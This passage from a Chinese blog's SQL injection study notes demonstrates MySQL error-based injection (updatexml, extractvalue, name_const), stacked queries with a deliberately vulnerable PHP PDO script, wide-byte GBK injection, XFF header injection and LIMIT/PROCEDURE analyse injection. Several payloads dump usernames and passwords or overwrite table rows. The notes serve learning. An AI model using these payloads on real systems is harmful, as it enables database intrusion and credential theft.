+ERROR 1146 (42S02): Table &#39;newdb.users&#39; doesn&#39;t exist
+&#39;&#39;&#39;
+这里不会提供任何数据，因为我们试图使用目标数据库来转储数据
+如果注入点在其他表库，我们可以从另一个表中转储数据，而不是从表本身的数据中转储数据
+这只适用于Update语句
+&#39;&#39;&#39;
+
+成功
+UPDATE news SET title=&#39;Nicky&#39; or Updatexml(1,concat(0x7e,(SELECT concat_ws(&#39;:&#39;,id, username, password) FROM test.users limit 0,1)),0) or&#39;&#39; WHERE id=1;
+ERROR 1105 (HY000): XPATH syntax error: &#39;~1:Dumb:Dumb&#39;</code></pre><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>payload：<code>or extractvalue(1,concat(0x7e,database())) or &#39;&#39;</code></p>
+<pre><code># 获取数据
+INSERT INTO users (id, username, password) VALUES (2,&#39;Olivia&#39; or extractvalue(1,concat(0x7e,(SELECT concat_ws(&#39;:&#39;,id, username, password) FROM users limit 0,1))) or &#39;&#39;, &#39;Nervo&#39;);
+ERROR 1105 (HY000): XPATH syntax error: &#39;~1:Dumb:Dumb&#39;</code></pre><p>这里和updatexml()的大同小异，就不详细写出来了<br>相同的规则适用于updatexml()方法中提到的update语句</p>
+<h2 id="name-const"><a href="#name-const" class="headerlink" title="name_const()"></a>name_const()</h2><p>此处还是有点不理解。。。。待重写</p>
+<p>此函数是在mysql版本5.0.12中添加的</p>
+<pre><code>name_const(name,value)
+作用：返回给定的值,当用来产生一个结果集合列时, name_const()促使该列使用给定名称</code></pre><p>payload：<code>or (SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a) or &#39;&#39;</code></p>
+<blockquote>
+<p>Ps：在mysql最新版本中，只能从该函数获中获取版本，&gt;=5.0.12的旧版本中，可以进一步提取数据</p>
+</blockquote>
+<pre><code>INSERT INTO users (id, username, password) VALUES (1,&#39;Olivia&#39; or (SELECT*FROM(SELECT name_const((SELECT 2),1),name_const((SELECT 2),1))a) or &#39;&#39;, &#39;Nervo&#39;)
+ERROR 1210 (HY000): Incorrect arguments to NAME_CONST
+得到该错误就不用继续了</code></pre><p>由于我的环境问题，我这就直接把语句粘贴进来，大家自行测试吧</p>
+<pre><code># 获取表
+INSERT INTO users (id, username, password) VALUES (1,&#39;Olivia&#39; or (SELECT*FROM(SELECTname_const((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1),1),name_const(( SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1),1))a) or &#39;&#39;,&#39;Nervo&#39;);
+
+# 获取数据
+INSERT INTO users (id, username, password) VALUES (2,&#39;Olivia&#39; or (SELECT*FROM(SELECT name_const((SELECT concat_ws(0x7e,id, username, password) FROM users limit 0,1),1),name_const(( SELECT concat_ws(0x7e,id, username, password) FROM users limit 0,1),1))a) or &#39;&#39;, &#39;Nervo&#39;);</code></pre><hr>
+<h1 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h1><p>堆叠查询可以执行多语句，多语句之间以分号(;)隔开<br>通过添加一个新的查询或者终止查询，可以达到修改数据和调用存储过程的目的</p>
+<blockquote>
+<p>局限：并不是每个环境下都可以执行，可能受到API或者数据库引擎不支持的限制或权限不足</p>
+</blockquote>
+<p>这里可以使用的注入方式：盲注，堆叠注入（堆查注入）</p>
+<pre><code class="php"># 测试脚本
+# 该脚本来自于《Web安全攻防》
+try{
+    $conn = new PDO(&quot;mysql:host=localhost;dbname=test&quot;,&quot;root&quot;,&quot;root&quot;);
+    $conn -&gt; setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);
+    $stmt = $conn -&gt; query(&quot;SELECT * FROM users where `id` =&#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;&quot;);
+    $result = $stmt -&gt; setFetchMode(PDO::FETCH_ASSOC);
+    foreach($stmt-&gt;fetchAll() as $k=&gt;$v ){
+        foreach($v as $key =&gt; $value){
+            echo $value;
+        }
+    }
+
+    $dsn = null;
+}
+
+catch(PDOException $e){
+    echo &quot;error&quot;;
+}
+$conn = null;</code></pre>
+<blockquote>
+<p>Sql执行语句：$stmt = $conn -&gt; query(“SELECT * FROM users where `id` =’”.$_GET[‘id’].”‘“);</p>
+</blockquote>
+<pre><code># 堆叠语句
+id=1&#39;;select if(substr(user(),1,1)=&#39;r&#39;,0,slepp(5)) %23
+
+# update更新数据
+id=1&#39;;update users SET username=user() where id=1 %23
+原数据会被覆盖掉</code></pre><p>这里产生的原因：PDO执行SQL语句时，可以执行多语句，不过这样通常不能直接得到结果，PDO只会返回第一条执行的结果<br>可以使用update更新数据/insert插入再进行访问或者使用盲注获取数据</p>
+<hr>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p><code>mysql_escape_string，addslashes</code> 过滤和转义一些特殊字符的函数<br>在对数据都进行一些转义，但是转义后的”&quot;并不会插入到数据库中</p>
+<p>此处待实验。。。</p>
+<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p><img src="/images%5CWeb%5CSql%5Ctwo.png" srcset="/img/loading.gif" alt=""><br>系统没有对已经存入数据库的数据做检测</p>
+<p>先构造语句，有被转义字符的语句，把恶意语句存入数据库<br>然后，我们进行二次构造语句</p>
+<hr>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>如果’被转义成<br>当数据库的编码为GBK时，并且在数据库查询前执行GBK编码设置，就可以使用宽字节注入<br>宽字节的格式是在地址后先加一个<code>%df&#39;</code></p>
+<p>在GBK编码中，%df%5c是繁体字“蓮”，所以这时，可以造成单引号逃逸！<br>payload：<code>1%df&#39; %23</code></p>
+<p>如果进行查询数据库的表名之类时，由于单引号被转义，导致SQL语句出错，所以需要利用<code>嵌套查询</code><br>查询表名：<code>select table_name from information_schema.tables where table_schema=(select database()) limit 0,1</code><br>查看字段：<code>select column_name from information_schema.columns where table_schema=(select database()) and table_name = (select table_name from information_schema.tables wherer table_schema=(select database()) limit 0,1) limit 0,1</code><br>第一层是：table_schema，第二和第三层：table_name<br>limit 第一个：表名，第二个：字段名</p>
+<p>如果把数据库编码改成gb2312,是没有注入的<br>这归结于gb2312编码的取值范围，它的高位范围0xA1<del>0xF7，低范围0xA1</del>0xFE，而\是0x5c<br>只有在低范围中含有0x5c的编码，就可以进行宽字符注入</p>
+<hr>
+<h1 id="XFF-注入"><a href="#XFF-注入" class="headerlink" title="XFF 注入"></a>XFF 注入</h1><p>HTTP请求头中有一个<code>X-Forwarded-for</code>参数<br>代表客户端真实的IP，修改则可以伪造客户端IP</p>
+<p>在该参数中进行测试即可！</p>
+<hr>
+<h1 id="Mysql-limit注入"><a href="#Mysql-limit注入" class="headerlink" title="Mysql limit注入"></a>Mysql limit注入</h1><p>适用于5.x中，在limit语句后面的注入</p>
+<pre><code>select field from table where id&gt;0 order by id limit injection_point</code></pre><p>上面的语句包含了order by，mysql当中union语句不能在order by的后面</p>
+<pre><code>SELECT 
+    [ALL | DISTINCT | DISTINCTROW ] 
+      [HIGH_PRIORITY] 
+      [STRAIGHT_JOIN] 
+      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] 
+      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] 
+    select_expr [, select_expr ...] 
+    [FROM table_references 
+    [WHERE where_condition] 
+    [GROUP BY {col_name | expr | position} 
+      [ASC | DESC], ... [WITH ROLLUP]] 
+    [HAVING where_condition] 
+    [ORDER BY {col_name | expr | position} 
+      [ASC | DESC], ...] 
+    [LIMIT {[offset,] row_count | row_count OFFSET offset}] 
+    [PROCEDURE procedure_name(argument_list)] 
+    [INTO OUTFILE &#39;file_name&#39; export_options 
+      | INTO DUMPFILE &#39;file_name&#39; 
+      | INTO var_name [, var_name]] 
+    [FOR UPDATE | LOCK IN SHARE MODE]]</code></pre><blockquote>
+<p>Ps：limti 后面可以跟两个函数，PROCEDURE 和 INTO</p>
+</blockquote>
+<ul>
+<li>INTO除非有些shell的权限，否则无法利用</li>
+<li>procedure analyse()后面可以跟两个函数<pre><code>是Mysql内置对Mysql字段值进行统计分析后给出建议的字段类型</code></pre></li>
+</ul>
+<p>利用</p>
+<pre><code># 报错
+SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
+
+# 直接使用sleep不行，需要用BENCHMARK代替
+SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></pre><hr>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.ms08067.com/" target="_blank" rel="noopener">http://www.ms08067.com/</a><br><a href="https://xz.aliyun.com/" target="_blank" rel="noopener">https://xz.aliyun.com/</a><br><a href="http://www.xiaodi8.com/" target="_blank" rel="noopener">http://www.xiaodi8.com/</a></p>
+<p>大部分内容都是摘抄下来的，感谢各位！</p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/08/18/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>二次注入学习笔记</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/08/18/Web/Sql_str/">
+                        <span>靶场Sql字符串注入</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a rel="nofollow noopener"><b>2018</b></a>
+      <i class="fab fa-angular"></i>
+      <a rel="nofollow noopener"> <b>只因不值得</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Sql基础注入笔记&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
